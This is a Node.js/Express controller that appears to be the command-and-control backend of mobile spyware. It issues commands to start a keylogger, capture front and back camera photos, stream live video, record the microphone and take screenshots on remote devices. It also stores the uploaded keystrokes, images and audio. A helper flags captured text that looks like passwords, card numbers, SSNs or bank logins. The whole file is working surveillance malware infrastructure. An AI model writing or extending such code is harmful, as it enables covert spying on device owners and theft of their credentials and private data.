const Device = require('../models/Device');
const Keylog = require('../models/Keylog');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');
const sharp = require('sharp');
const { sendToDevice } = require('../services/websocketService');
const { logger } = require('../utils/logger');
const { cache } = require('../config/redis');

// Keylogger
const startKeylogger = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;

    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    if (!device.isOnline) {
      return res.status(400).json({
        success: false,
        error: 'Device is offline'
      });
    }

    const commandId = uuidv4();
    const sent = sendToDevice(deviceId, 'start_keylogger', {
      commandId,
      timestamp: new Date().toISOString()
    });

    if (!sent) {
      return res.status(400).json({
        success: false,
        error: 'Failed to send command to device'
      });
    }

    // Update device
    device.keylogger = { isActive: true, logs: device.keylogger?.logs || [] };
    await device.save();

    res.json({
      success: true,
      message: 'Keylogger started successfully',
      data: { commandId }
    });
  } catch (error) {
    logger.error('Start keylogger error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const stopKeylogger = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;

    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const commandId = uuidv4();
    const sent = sendToDevice(deviceId, 'stop_keylogger', {
      commandId,
      timestamp: new Date().toISOString()
    });

    if (!sent) {
      return res.status(400).json({
        success: false,
        error: 'Failed to send command to device'
      });
    }

    device.keylogger.isActive = false;
    await device.save();

    res.json({
      success: true,
      message: 'Keylogger stopped successfully',
      data: { commandId }
    });
  } catch (error) {
    logger.error('Stop keylogger error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const syncKeylogs = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { logs } = req.body;

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    for (const log of logs) {
      const keylog = new Keylog({
        deviceId,
        userId: device.userId,
        text: log.text,
        app: log.app,
        packageName: log.packageName,
        timestamp: log.timestamp || new Date(),
        isSensitive: isSensitiveText(log.text)
      });
      await keylog.save();

      // Add to device's keylog array (keep last 10000)
      device.keylogger.logs.push({
        text: log.text,
        timestamp: log.timestamp || new Date(),
        app: log.app,
        packageName: log.packageName
      });
      
      if (device.keylogger.logs.length > 10000) {
        device.keylogger.logs = device.keylogger.logs.slice(-10000);
      }
    }

    await device.save();

    res.json({
      success: true,
      message: `Synced ${logs.length} keylogs`,
      total: device.keylogger.logs.length
    });
  } catch (error) {
    logger.error('Sync keylogs error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const getKeylogs = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;
    const { limit = 100, page = 1, startDate, endDate } = req.query;

    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    let query = { deviceId, userId };
    if (startDate || endDate) {
      query.timestamp = {};
      if (startDate) query.timestamp.$gte = new Date(startDate);
      if (endDate) query.timestamp.$lte = new Date(endDate);
    }

    const skip = (parseInt(page) - 1) * parseInt(limit);
    const logs = await Keylog.find(query)
      .sort({ timestamp: -1 })
      .skip(skip)
      .limit(parseInt(limit));

    const total = await Keylog.countDocuments(query);

    res.json({
      success: true,
      data: logs,
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        total,
        pages: Math.ceil(total / parseInt(limit))
      }
    });
  } catch (error) {
    logger.error('Get keylogs error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Camera
const takePhoto = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;
    const { camera = 'back' } = req.body;

    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    if (!device.isOnline) {
      return res.status(400).json({
        success: false,
        error: 'Device is offline'
      });
    }

    const commandId = uuidv4();
    const sent = sendToDevice(deviceId, 'take_photo', {
      commandId,
      camera,
      timestamp: new Date().toISOString()
    });

    if (!sent) {
      return res.status(400).json({
        success: false,
        error: 'Failed to send command to device'
      });
    }

    res.json({
      success: true,
      message: `Photo command sent to ${camera} camera`,
      data: { commandId }
    });
  } catch (error) {
    logger.error('Take photo error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const receivePhoto = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { camera, photoData, commandId } = req.body;

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    // Create upload directory if not exists
    const uploadDir = path.join(__dirname, '../../uploads/photos');
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }

    // Save photo
    const filename = `${deviceId}_${Date.now()}_${camera}.jpg`;
    const filepath = path.join(uploadDir, filename);
    const relativePath = `/uploads/photos/${filename}`;

    // Convert base64 to buffer and save
    const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    fs.writeFileSync(filepath, buffer);

    // Create thumbnail
    const thumbDir = path.join(__dirname, '../../uploads/thumbnails');
    if (!fs.existsSync(thumbDir)) {
      fs.mkdirSync(thumbDir, { recursive: true });
    }
    const thumbFilename = `thumb_${filename}`;
    const thumbPath = path.join(thumbDir, thumbFilename);
    await sharp(filepath).resize(300, 300).toFile(thumbPath);

    // Update device
    if (camera === 'front') {
      device.camera = {
        ...device.camera,
        lastPhoto: {
          front: relativePath,
          thumbnail: `/uploads/thumbnails/${thumbFilename}`,
          timestamp: new Date()
        }
      };
    } else {
      device.camera = {
        ...device.camera,
        lastPhoto: {
          back: relativePath,
          thumbnail: `/uploads/thumbnails/${thumbFilename}`,
          timestamp: new Date()
        }
      };
    }
    await device.save();

    res.json({
      success: true,
      message: 'Photo received',
      data: {
        path: relativePath,
        thumbnail: `/uploads/thumbnails/${thumbFilename}`
      }
    });
  } catch (error) {
    logger.error('Receive photo error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const startLiveCamera = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;
    const { camera = 'back', quality = 'medium' } = req.body;

    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    if (!device.isOnline) {
      return res.status(400).json({
        success: false,
        error: 'Device is offline'
      });
    }

    const commandId = uuidv4();
    const sent = sendToDevice(deviceId, 'start_live_camera', {
      commandId,
      camera,
      quality,
      timestamp: new Date().toISOString()
    });

    if (!sent) {
      return res.status(400).json({
        success: false,
        error: 'Failed to send command to device'
      });
    }

    device.camera = {
      ...device.camera,
      isStreaming: true,
      streamStartTime: new Date(),
      streamCamera: camera
    };
    await device.save();

    res.json({
      success: true,
      message: 'Live camera started',
      data: { commandId }
    });
  } catch (error) {
    logger.error('Start live camera error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const stopLiveCamera = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;

    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const commandId = uuidv4();
    const sent = sendToDevice(deviceId, 'stop_live_camera', {
      commandId,
      timestamp: new Date().toISOString()
    });

    device.camera = {
      ...device.camera,
      isStreaming: false,
      streamEndTime: new Date()
    };
    await device.save();

    res.json({
      success: true,
      message: 'Live camera stopped',
      data: { commandId }
    });
  } catch (error) {
    logger.error('Stop live camera error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Microphone
const startListening = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;

    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    if (!device.isOnline) {
      return res.status(400).json({
        success: false,
        error: 'Device is offline'
      });
    }

    const commandId = uuidv4();
    const sent = sendToDevice(deviceId, 'start_listening', {
      commandId,
      timestamp: new Date().toISOString()
    });

    if (!sent) {
      return res.status(400).json({
        success: false,
        error: 'Failed to send command to device'
      });
    }

    device.microphone = {
      ...device.microphone,
      isListening: true,
      listenStartTime: new Date()
    };
    await device.save();

    res.json({
      success: true,
      message: 'Microphone listening started',
      data: { commandId }
    });
  } catch (error) {
    logger.error('Start listening error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const stopListening = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;

    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    const commandId = uuidv4();
    const sent = sendToDevice(deviceId, 'stop_listening', {
      commandId,
      timestamp: new Date().toISOString()
    });

    device.microphone = {
      ...device.microphone,
      isListening: false,
      listenEndTime: new Date()
    };
    await device.save();

    res.json({
      success: true,
      message: 'Microphone listening stopped',
      data: { commandId }
    });
  } catch (error) {
    logger.error('Stop listening error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const receiveAudio = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { audioData, duration, commandId } = req.body;

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    // Create audio directory
    const audioDir = path.join(__dirname, '../../uploads/audio');
    if (!fs.existsSync(audioDir)) {
      fs.mkdirSync(audioDir, { recursive: true });
    }

    // Save audio file
    const filename = `${deviceId}_${Date.now()}.mp3`;
    const filepath = path.join(audioDir, filename);
    const relativePath = `/uploads/audio/${filename}`;

    // Convert base64 to buffer and save
    const base64Data = audioData.replace(/^data:audio\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    fs.writeFileSync(filepath, buffer);

    device.microphone = {
      ...device.microphone,
      lastRecording: relativePath,
      recordingDuration: duration,
      lastRecordingTime: new Date()
    };
    await device.save();

    res.json({
      success: true,
      message: 'Audio received',
      data: { path: relativePath }
    });
  } catch (error) {
    logger.error('Receive audio error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Screenshots
const takeScreenshot = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const userId = req.user._id;

    const device = await Device.findOne({ deviceId, userId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    if (!device.isOnline) {
      return res.status(400).json({
        success: false,
        error: 'Device is offline'
      });
    }

    const commandId = uuidv4();
    const sent = sendToDevice(deviceId, 'take_screenshot', {
      commandId,
      timestamp: new Date().toISOString()
    });

    if (!sent) {
      return res.status(400).json({
        success: false,
        error: 'Failed to send command to device'
      });
    }

    res.json({
      success: true,
      message: 'Screenshot command sent',
      data: { commandId }
    });
  } catch (error) {
    logger.error('Take screenshot error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const receiveScreenshot = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { screenshotData, commandId } = req.body;

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        error: 'Device not found'
      });
    }

    // Create screenshots directory
    const screenshotDir = path.join(__dirname, '../../uploads/screenshots');
    if (!fs.existsSync(screenshotDir)) {
      fs.mkdirSync(screenshotDir, { recursive: true });
    }

    // Save screenshot
    const filename = `${deviceId}_${Date.now()}.jpg`;
    const filepath = path.join(screenshotDir, filename);
    const relativePath = `/uploads/screenshots/${filename}`;

    const base64Data = screenshotData.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    fs.writeFileSync(filepath, buffer);

    // Create thumbnail
    const thumbDir = path.join(__dirname, '../../uploads/thumbnails');
    if (!fs.existsSync(thumbDir)) {
      fs.mkdirSync(thumbDir, { recursive: true });
    }
    const thumbFilename = `thumb_${filename}`;
    const thumbPath = path.join(thumbDir, thumbFilename);
    await sharp(filepath).resize(200, 400).toFile(thumbPath);

    // Add to device screenshots
    device.screenshots = device.screenshots || [];
    device.screenshots.push({
      path: relativePath,
      thumbnail: `/uploads/thumbnails/${thumbFilename}`,
      timestamp: new Date()
    });

    // Keep last 100 screenshots
    if (device.screenshots.length > 100) {
      device.screenshots = device.screenshots.slice(-100);
    }

    await device.save();

    res.json({
      success: true,
      message: 'Screenshot received',
      data: {
        path: relativePath,
        thumbnail: `/uploads/thumbnails/${thumbFilename}`
      }
    });
  } catch (error) {
    logger.error('Receive screenshot error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Helper function to detect sensitive text
const isSensitiveText = (text) => {
  const sensitivePatterns = [
    /password/i, /passwort/i, /senha/i, /contraseña/i,
    /credit card/i, /creditcard/i, /cvv/i,
    /ssn/i, /social security/i,
    /bank account/i, /bankaccount/i,
    /login/i, /sign in/i,
    /email/i, /phone/i, /address/i
  ];
  return sensitivePatterns.some(pattern => pattern.test(text));
};

module.exports = {
  startKeylogger,
  stopKeylogger,
  syncKeylogs,
  getKeylogs,
  takePhoto,
  receivePhoto,
  startLiveCamera,
  stopLiveCamera,
  startListening,
  stopListening,
  receiveAudio,
  takeScreenshot,
  receiveScreenshot
};
